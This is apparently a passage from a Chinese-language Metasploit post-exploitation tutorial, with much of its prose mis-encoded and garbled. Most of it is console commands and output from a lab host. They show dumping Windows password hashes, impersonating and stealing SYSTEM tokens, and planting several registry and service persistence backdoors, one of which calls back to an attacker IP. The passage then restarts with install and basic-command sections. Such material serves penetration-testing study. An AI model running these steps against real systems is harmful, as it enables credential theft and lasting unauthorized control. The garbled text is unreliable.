OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>3.post/windows/gather/smart_hashdumpä»ä¸Šé¢ä¹Ÿå¯ä»¥çœ‹å‡ºå®˜æ–¹æ¨è<code>post/windows/gather/smart_hashdump</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>4.powerdump<br>åŒ hashdumpï¼Œä½†å¤±è´¥äº†<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure><h3 id="4-7-å‡å†’ä»¤ç‰Œ-2"><a href="#4-7-å‡å†’ä»¤ç‰Œ-2" class="headerlink" title="4.7 å‡å†’ä»¤ç‰Œ"></a>4.7 å‡å†’ä»¤ç‰Œ</h3>åœ¨ç”¨æˆ·ç™»å½•windowsæ“ä½œç³»ç»Ÿæ—¶ï¼Œç³»ç»Ÿéƒ½ä¼šç»™ç”¨æˆ·åˆ†é…ä¸€ä¸ªä»¤ç‰Œ(Token)ï¼Œå½“ç”¨æˆ·è®¿é—®ç³»ç»Ÿèµ„æºæ—¶éƒ½ä¼šä½¿ç”¨è¿™ä¸ªä»¤ç‰Œè¿›è¡Œèº«ä»½éªŒè¯ï¼ŒåŠŸèƒ½ç±»ä¼¼äºç½‘ç«™çš„sessionæˆ–è€…cookieã€‚msfæä¾›äº†ä¸€ä¸ªåŠŸèƒ½æ¨¡å—å¯ä»¥è®©æˆ‘ä»¬å‡å†’åˆ«äººçš„ä»¤ç‰Œï¼Œå®ç°èº«ä»½åˆ‡æ¢ï¼Œå¦‚æœç›®æ ‡ç¯å¢ƒæ˜¯åŸŸç¯å¢ƒï¼Œåˆšå¥½åŸŸç®¡ç†å‘˜ç™»å½•è¿‡æˆ‘ä»¬å·²ç»æœ‰æƒé™çš„ç»ˆç«¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å‡å†’æˆåŸŸç®¡ç†å‘˜çš„è§’è‰²ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognitoå‡å†’ä»¤ç‰Œ</span><br><span class="line">use incognito      #help incognito  æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">list_tokens -u    #æŸ¥çœ‹å¯ç”¨çš„token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #å‡å†’SYSTEM token</span><br><span class="line">æˆ–è€…impersonate_token NT\ AUTHORITY\\SYSTEM #ä¸åŠ å•å¼•å· éœ€ä½¿ç”¨\\</span><br><span class="line">execute -f cmd.exe -i â€“t    # -t ä½¿ç”¨å‡å†’çš„token æ‰§è¡Œ</span><br><span class="line">æˆ–è€…ç›´æ¥shell</span><br><span class="line">rev2self   #è¿”å›åŸå§‹token</span><br><span class="line"></span><br><span class="line"># 2.steal_tokençªƒå–ä»¤ç‰Œ</span><br><span class="line">steal_token &lt;pidå€¼&gt;   #ä»æŒ‡å®šè¿›ç¨‹ä¸­çªƒå–token   å…ˆps</span><br><span class="line">drop_token  #åˆ é™¤çªƒå–çš„token</span><br></pre></td></tr></table></figure><h3 id="4-8-æ¤å…¥åé—¨-2"><a href="#4-8-æ¤å…¥åé—¨-2" class="headerlink" title="4.8 æ¤å…¥åé—¨"></a>4.8 æ¤å…¥åé—¨</h3>Meterpreterä»…ä»…æ˜¯åœ¨å†…å­˜ä¸­é©»ç•™çš„Shellcodeï¼Œåªè¦ç›®æ ‡æœºå™¨é‡å¯å°±ä¼šä¸§å¤±æ§åˆ¶æƒï¼Œä¸‹é¢å°±ä»‹ç»å¦‚ä½•æ¤å…¥åé—¨ï¼Œç»´æŒæ§åˆ¶ã€‚1.persistenceå¯åŠ¨é¡¹åé—¨è·¯å¾„ï¼šmetasploit/scripts/meterpreter/persistenceåŸç†æ˜¯åœ¨<code>C:\Users***\AppData\Local\Temp\</code>ç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªvbsè„šæœ¬ï¼Œåœ¨æ³¨å†Œè¡¨<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>åŠ å…¥å¼€æœºå¯åŠ¨é¡¹ï¼Œ<strong>å¾ˆå®¹æ˜“è¢«æ€è½¯æ‹¦æˆªï¼Œå®˜æ–¹ä¸æ¨è</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence â€“h  #æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-XæŒ‡å®šå¯åŠ¨çš„æ–¹å¼ä¸ºå¼€æœºè‡ªå¯åŠ¨ï¼Œ-iåå‘è¿æ¥çš„æ—¶é—´é—´éš”(5s) â€“r æŒ‡å®šæ”»å‡»è€…çš„ip</span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>èƒ½å®ç°åŒæ ·åŠŸèƒ½çš„è„šæœ¬è¿˜æœ‰ï¼šexploit/windows/local/persistence2.metsvcæœåŠ¡åé—¨åœ¨C:\Users<em><strong>\AppData\Local\Temp\ç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªvbsè„šæœ¬<br>åœ¨æ³¨å†Œè¡¨HKLM\Software\Microsoft\Windows\CurrentVersion\Run\åŠ å…¥å¼€æœºå¯åŠ¨é¡¹ã€‚</strong>é€šè¿‡æœåŠ¡å¯åŠ¨ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œå®˜æ–¹ä¸æ¨èä½¿ç”¨ï¼Œè¿è¡Œå¤±è´¥</em>*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc â€“A   #è‡ªåŠ¨å®‰è£…åé—¨</span><br><span class="line"></span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; run metsvc â€“A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>ä¸‰ä¸ªæ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œä½†æœåŠ¡æ²¡æœ‰å¯åŠ¨èµ·æ¥ï¼Œå¤±è´¥äº†ã€‚ä½¿ç”¨<code>-r</code>å‚æ•°å¯å¸è½½æœåŠ¡ã€‚3.persistence_exeå†æ¥çœ‹çœ‹å®˜æ–¹æ¨èçš„ä¸œè¥¿å§<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>æ­¤æ¨¡å—å°†å¯æ‰§è¡Œæ–‡ä»¶ä¸Šè½½åˆ°è¿œç¨‹ä¸»æœºå¹¶è¿›è¡Œåˆ›å»ºæŒä¹…æ€§ã€‚<br>æ¶‰åŠåˆ°å››ä¸ªå‚æ•°<ul><li>REXENAMEæ˜¯æ‹·è´åˆ°ç›®æ ‡ç³»ç»Ÿä¸­çš„åå­—</li><li>EXEPATHæ˜¯å°†è¦ä¸Šä¼ çš„åé—¨åœ¨æœ¬åœ°çš„ä½ç½®</li><li>SESSIONæ˜¯é€‰æ‹©è¿è¡Œæ­¤æ¨¡å—çš„ä¼šè¯</li><li>STARTUPæ˜¯å¯åŠ¨ç±»å‹ï¼Œæœ‰USERã€SYSTEMã€SERVICEè¿™ä¸‰ç§å–å€¼ï¼ŒUSERè¡¨ç¤ºä¸ºå°†åœ¨ç”¨æˆ·ç™»å½•æ—¶å¯åŠ¨ï¼ŒSYSTEMè¡¨ç¤ºå°†åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶å¯åŠ¨(éœ€è¦æƒé™)ï¼ŒSERVICEè¡¨ç¤ºå°†åˆ›å»ºä¸€ä¸ªå¯åŠ¨æœåŠ¡é¡¹(éœ€è¦æƒé™)ã€‚</li></ul>å°è¯•ä¸€ä¸‹ï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>4.registry_persistenceå®Œæ•´è·¯å¾„ä¸ºexploit/windows/local/registry_persistenceå’Œç¬¬ä¸€ç§æ–¹æ³•ç±»ä¼¼ï¼Œæ­¤æ¨¡å—å°†ä¼šå®‰è£…ä¸€ä¸ªpayloadåˆ°æ³¨å†Œè¡¨çš„å¯åŠ¨é¡¹ä¸­ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>åŒç±»å‹çš„è¿˜æœ‰å…¶ä»–payloadï¼Œå¦‚exploit/windows/local/vss_persistenceï¼Œexploit/windows/local/s4u_persistenceã€‚<h2 id="å‚è€ƒ-2"><a href="#å‚è€ƒ-2" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li><li><a href="https://www.anquanke.com/post/id/164525">èŒæ–°ç§‘æ™® æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•ç”¨MSFè¿›è¡Œåæ¸—é€æµ‹è¯• - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å°</a></li><li><a href="https://www.freebuf.com/sectool/118714.html">è®¿é—®çš„æ–‡ç« å®¡æ ¸ä¸­â€¦ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a>## 1. å®‰è£…è¿è¡ŒåŠåˆå§‹åŒ–å®‰è£…<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># å®‰è£…</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># å®‰è£…å®Œæˆåä½ç½®</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># ç›®å½•ç»“æ„ </span><br><span class="line">--modules é‡ç‚¹çœ‹è¿™é‡Œå°±è¡Œäº†</span><br><span class="line">  --auxiliary ä¸»è¦åŒ…å«è¾…åŠ©æ€§è„šæœ¬(æ‰«æã€å—…æ¢ã€æ³¨å…¥ã€çˆ†ç ´ï¼Œæ¼æ´æŒ–æ˜)</span><br><span class="line">  --encoders ä¸»è¦åŒ…å«å„ç§ç¼–ç å·¥å…·ï¼Œä»¥ä¾¿ç»•è¿‡å…¥ä¾µæ£€æµ‹å’Œè¿‡æ»¤ç³»ç»Ÿ</span><br><span class="line">  --exploits æ¼æ´åˆ©ç”¨ï¼ŒåŒ…å«ä¸»æµçš„æ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œexpå‘½åè§„åˆ™:ç³»ç»Ÿ/æœåŠ¡/æ¨¡å—</span><br><span class="line">  --nops ç»•è¿‡é’ˆå¯¹æº¢å‡ºæ”»å‡»æ»‘è¡Œå­—ç¬¦ä¸²çš„æ‹¦æˆªæ£€æµ‹</span><br><span class="line">  --payloads æ”»å‡»è·è½½ï¼Œä¸»è¦åœ¨ç›®æ ‡æœºå™¨æ‰§è¡Œä»£ç </span><br><span class="line">  --post æ­¤ç›®å½•æ”¾ç€msfçš„exploitæ‰§è¡ŒæˆåŠŸåï¼Œå‘ç›®æ ‡å‘é€çš„ä¸€äº›åŠŸèƒ½æ€§æŒ‡ä»¤ï¼Œå¦‚ææƒï¼Œè·å–hashç­‰</span><br><span class="line">  --evasion æ–°å¢ï¼Œç”¨æ¥ç”Ÿæˆå…æ€payloadï¼Œç±»ä¼¼äºé›†æˆmsfvenomåŠŸèƒ½</span><br><span class="line">--data æ”¾äº†meterpreter ï¼ŒpassiveXï¼Œvncï¼ŒDLLsï¼Œç­‰è¿™äº›å·¥å…·å’Œä¸€äº›ç”¨æˆ·æ¥å£ä»£ç ï¼Œmsfweb å’Œä¸€äº›å…¶ä»–æ¨¡å—ç”¨åˆ°çš„æ•°æ®æ–‡ä»¶</span><br><span class="line">--plugins è¿™é‡Œçš„æ¨¡å—ç”¨æˆ·éœ€è¦loadæ¥åŠ è½½ï¼Œæä¾›æ•°æ®åº“è¿æ¥æ’ä»¶å’Œå„ç§è¦ç”¨åˆ°çš„æ’ä»¶</span><br><span class="line">--scripts è¿™ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶å¤§éƒ½æ˜¯meterpreterè¿™ä¸ªæ¨¡å—åˆ©ç”¨çš„è„šæœ¬ï¼Œæ¯”å¦‚ç”¨åˆ°migrateæ¥è½¬ç§»åˆ°å…¶ä»–è¿›ç¨‹çš„æŒ‡ä»¤çš„æºä»£ç å°±åœ¨æ­¤</span><br><span class="line">--tools åŒ…å«ä¸€äº›æœ‰ç”¨çš„è„šæœ¬å’Œé›¶æ•£çš„å·¥å…·</span><br></pre></td></tr></table></figure>å¯åŠ¨<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># è¿è¡Œ</span><br><span class="line">$ msfconsole</span><br><span class="line"># åˆå§‹åŒ–æ•°æ®åº“</span><br><span class="line">$ msfdb init</span><br><span class="line"># é‡å»ºç¼“å­˜</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># æŸ¥çœ‹æ•°æ®åº“è¿æ¥æƒ…å†µ</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure><h2 id="2-msfåŸºæœ¬å‘½ä»¤-3"><a href="#2-msfåŸºæœ¬å‘½ä»¤-3" class="headerlink" title="2. msfåŸºæœ¬å‘½ä»¤"></a>2. msfåŸºæœ¬å‘½ä»¤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits â€“ æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„æ¸—é€æ”»å‡»ç¨‹åºä»£ç  </span><br><span class="line">show auxiliary â€“ æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„è¾…åŠ©æ”»å‡»å·¥å…· </span><br><span class="line">show options â€“ æŸ¥çœ‹è¯¥æ¨¡å—æ‰€æœ‰å¯ç”¨é€‰é¡¹ </span><br><span class="line">show payloads â€“ æŸ¥çœ‹è¯¥æ¨¡å—é€‚ç”¨çš„æ‰€æœ‰è½½è·ä»£ç  </span><br><span class="line">show targets â€“ æŸ¥çœ‹è¯¥æ¨¡å—é€‚ç”¨çš„æ”»å‡»ç›®æ ‡ç±»å‹</span><br><span class="line">search â€“ æ ¹æ®å…³é”®å­—æœç´¢æŸæ¨¡å— </span><br><span class="line">info â€“ æ˜¾ç¤ºæŸæ¨¡å—çš„è¯¦ç»†ä¿¡æ¯ </span><br><span class="line">use â€“ è¿›å…¥ä½¿ç”¨æŸæ¸—é€æ”»å‡»æ¨¡å— </span><br><span class="line">back â€“ å›é€€ </span><br><span class="line">set/unset â€“ è®¾ç½®/ç¦ç”¨æ¨¡å—ä¸­çš„æŸä¸ªå‚æ•° </span><br><span class="line">setg/unsetg â€“ è®¾ç½®/ç¦ç”¨é€‚ç”¨äºæ‰€æœ‰æ¨¡å—çš„å…¨å±€å‚æ•° </span><br><span class="line">save â€“ å°†å½“å‰è®¾ç½®å€¼ä¿å­˜ä¸‹æ¥ï¼Œä»¥ä¾¿ä¸‹æ¬¡å¯åŠ¨MSFç»ˆç«¯æ—¶ä»å¯ä½¿ç”¨</span><br></pre></td></tr></table></figure><h2 id="3-msfvenomç”Ÿæˆpayload-3"><a 